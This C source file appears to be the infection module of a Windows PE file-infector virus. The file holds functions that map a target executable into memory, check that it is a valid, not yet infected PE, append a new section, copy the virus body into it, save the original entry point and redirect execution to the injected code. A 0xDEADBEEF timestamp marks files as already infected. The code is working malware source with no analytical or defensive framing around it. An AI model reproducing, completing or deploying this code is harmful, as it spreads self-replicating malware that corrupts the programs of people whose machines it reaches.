#include "infect.h"

typedef struct {
  HANDLE  hFile;
  HANDLE  hMap;
  void*   startAddress;
  DWORD   size;
} file_view_t;

static int can_infect(const char* filename, data_t* data);
static void modify_headers(IMAGE_NT_HEADERS* ntHeaders, uint32_t codeSize);
static void* copy_code(IMAGE_NT_HEADERS* ntHeaders, file_view_t* fileView, data_t* data);
static void modify_entrypoint(IMAGE_NT_HEADERS* ntHeaders, uint32_t entryOffset, void* targetCodeBegin);
static uint32_t get_extended_file_size(const char* filename, data_t* data);
static int open_file_view(const char* filename, file_view_t* fileView, data_t* data);
static void close_file_view(file_view_t* fileView, data_t* data);

int infect(const char* filename, data_t* data) {
  int ret = 0;
  if (can_infect(filename, data)) {
    file_view_t fileView;
    memzero(&fileView, sizeof(file_view_t));

    uint32_t extendedSize = get_extended_file_size(filename, data);
    fileView.size = extendedSize;
    if (open_file_view(filename, &fileView, data) == 0){
      IMAGE_NT_HEADERS* ntHeaders = get_nt_header(fileView.startAddress);

      modify_headers(ntHeaders, data->codeSize);
      void* targetCodeBegin = copy_code(ntHeaders, &fileView, data);
      modify_entrypoint(ntHeaders, data->entryOffset, targetCodeBegin);

      data->functions.flushViewOfFile(fileView.startAddress, extendedSize);
      
      close_file_view(&fileView, data);
    } else {
      ret = 1;
    }
  } else {
    ret = 2;
  }
  return ret;
}

static void modify_headers(IMAGE_NT_HEADERS* ntHeaders, uint32_t codeSize) {
  ntHeaders->FileHeader.TimeDateStamp = 0xDEADBEEF;
  ntHeaders->OptionalHeader.SizeOfCode += align_value(codeSize, ntHeaders->OptionalHeader.FileAlignment);
  ntHeaders->OptionalHeader.SizeOfImage += align_value(codeSize, ntHeaders->OptionalHeader.SectionAlignment);
  //ntHeaders->OptionalHeader.SizeOfHeaders = ? //TODO handle

  create_section_header(get_last_section_header(ntHeaders) + 1, ntHeaders, codeSize);
}

static void* copy_code(IMAGE_NT_HEADERS* ntHeaders, file_view_t* fileView, data_t* data) {
  IMAGE_SECTION_HEADER* sectionHeader = get_last_section_header(ntHeaders);
  void* targetCodeBegin = (uint8_t*)fileView->startAddress + sectionHeader->PointerToRawData;
  memcp(data->codeBegin, targetCodeBegin, data->codeSize);
  return targetCodeBegin;
}

// virus code must already been copied to target file! 
static void modify_entrypoint(IMAGE_NT_HEADERS* ntHeaders, uint32_t entryOffset, void* targetCodeBegin) {
  uint32_t oep = ntHeaders->OptionalHeader.ImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
  if (write_original_entry_point(oep, targetCodeBegin) != 0) {
    PRINT_DEBUG("could not save original entry point\n");
  }
  
  IMAGE_SECTION_HEADER* sectionHeader = get_last_section_header(ntHeaders);
  ntHeaders->OptionalHeader.AddressOfEntryPoint = sectionHeader->VirtualAddress + entryOffset;
}

static int can_infect(const char* filename, data_t* data) {
  file_view_t fw;
  memzero(&fw, sizeof(file_view_t));

  if (open_file_view(filename, &fw, data) != 0){
    PRINT_DEBUG("can't infect \"%s\": could not open file\n", filename);
    return 0;
  }

  if (!is_pe(fw.startAddress)) {
    PRINT_DEBUG("can't infect \"%s\": no valid pe\n", filename);
    close_file_view(&fw, data);
    return 0;
  }

  IMAGE_NT_HEADERS* ntHeaders = get_nt_header(fw.startAddress);
  IMAGE_SECTION_HEADER* sectionHeader = get_section_header(ntHeaders, ntHeaders->FileHeader.NumberOfSections);

  if (!is_section_header_empty(sectionHeader)) {
    PRINT_DEBUG("can't infect \"%s\": no additional empty section header\n", filename);
    close_file_view(&fw, data);
    return 0;
  }
  if (ntHeaders->FileHeader.TimeDateStamp == 0xDEADBEEF) {
    PRINT_DEBUG("can't infect \"%s\": already infected\n", filename);
    close_file_view(&fw, data);
    return 0;
  }
  return 1;
}

static uint32_t get_extended_file_size(const char* filename, data_t* data) {
  file_view_t fw;
  memzero(&fw, sizeof(file_view_t));

  if (open_file_view(filename, &fw, data) != 0){
    PRINT_DEBUG("could not open view of file\n");
    return 0;
  }
  IMAGE_NT_HEADERS* ntHeaders = get_nt_header(fw.startAddress);
  uint32_t extendedSize = fw.size + ntHeaders->OptionalHeader.FileAlignment + align_value(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
  close_file_view(&fw, data);
  return extendedSize;
}

static int open_file_view(const char* filename, file_view_t* fileView, data_t* data) {
  fileView->hFile = data->functions.createFileA(
    filename,
    GENERIC_READ | GENERIC_WRITE,
    FILE_SHARE_READ | FILE_SHARE_WRITE,
    NULL,
    OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL,
    NULL
  );

  if (fileView->hFile == INVALID_HANDLE_VALUE) {
    return 1;
  }
  if(fileView->size == 0) {
    fileView->size = (DWORD)data->functions.getFileSize(fileView->hFile, NULL);
    if (fileView->size == INVALID_FILE_SIZE) {
      data->functions.closeHandle(fileView->hFile);
      return 2;
    }
  }

  fileView->hMap = data->functions.createFileMappingA(
    fileView->hFile,
    NULL,
    PAGE_READWRITE,
    0,
    fileView->size,
    NULL
  );

  if (fileView->hMap == NULL) {
    data->functions.closeHandle(fileView->hFile);
    return 3;
  }

  fileView->startAddress = (void*)data->functions.mapViewOfFile(
    fileView->hMap,
    FILE_MAP_ALL_ACCESS,
    0,
    0,
    fileView->size
  );

  if (fileView->startAddress == NULL) {
    data->functions.closeHandle(fileView->hMap);
    data->functions.closeHandle(fileView->hFile);
    return 4;
  }
  return 0;
}

static void close_file_view(file_view_t* fileView, data_t* data) {
  data->functions.unmapViewOfFile((LPCVOID)fileView->startAddress);
  data->functions.closeHandle(fileView->hMap);
  data->functions.closeHandle(fileView->hFile);
  memzero(fileView, sizeof(file_view_t));
}
